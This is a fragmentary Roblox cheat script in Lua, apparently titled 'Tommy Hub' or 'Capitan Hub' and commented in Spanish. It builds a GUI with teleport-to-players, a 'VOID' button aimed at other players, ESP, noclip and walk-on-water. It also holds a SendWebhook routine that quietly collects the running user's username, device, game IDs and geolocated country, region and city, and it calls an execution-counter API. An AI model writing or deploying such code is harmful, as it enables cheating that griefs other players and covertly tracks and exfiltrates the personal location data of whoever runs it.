...
local function Notify(data)
    ...
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = data.Title or "Tommy hub cargando ",
...
local function TeleportToAllPlayers()
    ...
    if not char or not char:FindFirstChild("HumanoidRootPart") then
        Notify({Title = "Error", Content = "No se encontro tu personaje.", Duration = 3})
        return
    end
    Notify({
    ...
    task.spawn(function()
        ...
        Notify({Title = "Completado", Content = "Has visitado a todos los jugadores.", Duration = 3})
    end)
end
...
local function CreatePlayerList()
    ...
    ScreenGui.Name         = "Capitan_PlayerList_V2"
...
QuickTpGui.Name  = "Botones_Capitan_Extra"
...
local function CrearBotonTP(nombre, texto, pos, colorBorde, destino, mensaje)
    ...
    btn.MouseButton1Click:Connect(function()
        TpTo(destino)
        Notify({Title = "Capitan Hub", Content = mensaje, Duration = 1.5})
    end)
end
...
Tab4:CreateButton({
    ...
    Callback = function()
        ...
        Notify({Title = "Camara", Content = "Distancia reseteada a 100", Duration = 2})
    end,
})
...
-- Configuración Estética Capitan Hub
local BG_MAIN = Color3.fromRGB(5, 5, 5) 
local BG_CARD = Color3.fromRGB(15, 15, 15)
local ACCENT_RED = Color3.fromRGB(255, 0, 0) -- Rojo Intenso
local TEXT_COLOR = Color3.fromRGB(255, 255, 255)

-- Interfaz Base
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Capitan Hub_PlayerList"
...
MainFrame.BorderColor3 = ACCENT_RED -- Borde Rojo
...
TitleBar.BorderColor3 = ACCENT_RED

local TitleLabel = Instance.new("TextLabel", TitleBar)
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Text = "Capitan Hub" -- Nombre actualizado
TitleLabel.TextColor3 = ACCENT_RED
TitleLabel.Font = Enum.Font.GothamBold
...
ListContainer.ScrollBarImageColor3 = ACCENT_RED
ListContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
...
-- Lógica Void Manual
local function RunManualVoid(targetPlayer)
    local char = lp.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    ...
    hrp.Anchored = true
    -- Teletransporte al vacío extremo
...
local function CreatePlayerCard(player)
    ...
    Card.BorderColor3 = Color3.fromRGB(80, 0, 0)
    ...
    AvatarImg.BorderColor3 = ACCENT_RED
    ...
    BarBack.Size = UDim2.new(1, -110, 0, 4)
    BarBack.Position = UDim2.new(0, 50, 0, 35)
    BarBack.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    BarBack.BorderSizePixel = 0

    -- Barra de Vida (Relleno)
    local BarFill = Instance.new("Frame", BarBack)
    BarFill.Size = UDim2.new(1, 0, 1, 0)
    BarFill.BackgroundColor3 = ACCENT_RED
    BarFill.BorderSizePixel = 0

    -- Botón Único: VOID
    local VoidBtn = Instance.new("TextButton", Card)
    VoidBtn.Name = "VoidBtn"
    VoidBtn.Size = UDim2.new(0, 50, 0, 30)
    VoidBtn.Position = UDim2.new(1, -55, 0.5, -15)
    VoidBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    VoidBtn.Text = "VOID"
    VoidBtn.TextColor3 = TEXT_COLOR
    VoidBtn.Font = Enum.Font.GothamBold
    VoidBtn.TextSize = 10
    VoidBtn.BorderSizePixel = 1
    VoidBtn.BorderColor3 = ACCENT_RED
    VoidBtn.MouseButton1Click:Connect(function()
        RunManualVoid(player)
    end)

    -- Actualización de Vida en Tiempo Real
    local conn
    conn = RunService.RenderStepped:Connect(function()
        if not player or not player.Parent or not ScreenGui.Parent then
            conn:Disconnect()
...
-- 📊 API contador
local COUNTER_API = "https://api.countapi.xyz/hit/tommyhub/executions"
...
local function GetGameInfo()
    ...
    return name, game.PlaceId, game.JobId
end
...
local function GetLocation()
    ...
    if success then
        ...
        return data.country or "?", data.regionName or "?", data.city or "?"
    end
...
local function SendWebhook()
    if enviado then return end
    enviado = true

    local device = GetDevice()
    local gameName, placeId, jobId = GetGameInfo()
    local country, region, city = GetLocation()
    local count = GetCount()
    local time = GetTime()

    local data = {
        ["embeds"] = {{
            ["title"] = "🔥 Tommy Hub ULTRA Activado",
            ["description"] =
                "**👤 Usuario:** " .. Player.Name ..
...
local function CreatePremiumInterface()
    local pgui = lp:WaitForChild("PlayerGui")
    if pgui:FindFirstChild("TommyHubV5_Premium") then
        pgui.TommyHubV5_Premium:Destroy()
    end

    local screenGui = Instance.new("ScreenGui", pgui)
    screenGui.Name = "TommyHubV5_Premium"
    screenGui.ResetOnSpawn = false

    local mainFrame = Instance.new("Frame", screenGui)
    mainFrame.Size = UDim2.new(0, 440, 0, 520)
    mainFrame.Position = UDim2.new(0.5, -220, 0.08, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(16, 16, 36)
    mainFrame.BorderSizePixel = 0
    ...
    topBar.BackgroundColor3 = Color3.fromRGB(40, 20, 110)

    local title = Instance.new("TextLabel", topBar)
    title.Size = UDim2.new(1, -24, 1, -18)
    title.Position = UDim2.new(0, 12, 0, 8)
    title.BackgroundTransparency = 1
    title.Text = "Tommy Hub v5"
    ...
    subtitle.TextColor3 = Color3.fromRGB(190, 170, 255)
    ...
    createButton("Toggle ESP", Color3.fromRGB(75, 145, 255), function()
        ESPEnabled = not ESPEnabled
        if ESPEnabled then UpdateESP() else ClearESP() end
        Notify({Title = "Tommy Hub v5", Content = ESPEnabled and "ESP activado" or "ESP desactivado", Duration = 2})
    end)

    createButton("Walk on Water", Color3.fromRGB(0, 175, 140), function()
        getgenv().WalkOnWater = not getgenv().WalkOnWater
        Notify({Title = "Tommy Hub v5", Content = getgenv().WalkOnWater and "Walk on Water activado" or "Walk on Water desactivado", Duration = 2})
    end)

    createButton("Toggle Noclip", Color3.fromRGB(170, 100, 255), function()
        getgenv().NoclipEnabled = not getgenv().NoclipEnabled
        Notify({Title = "Tommy Hub v5", Content = getgenv().NoclipEnabled and "Noclip activado" or "Noclip desactivado", Duration = 2})
    end)

    createButton("Cerrar Interfaz", Color3.fromRGB(110, 110, 110), function()
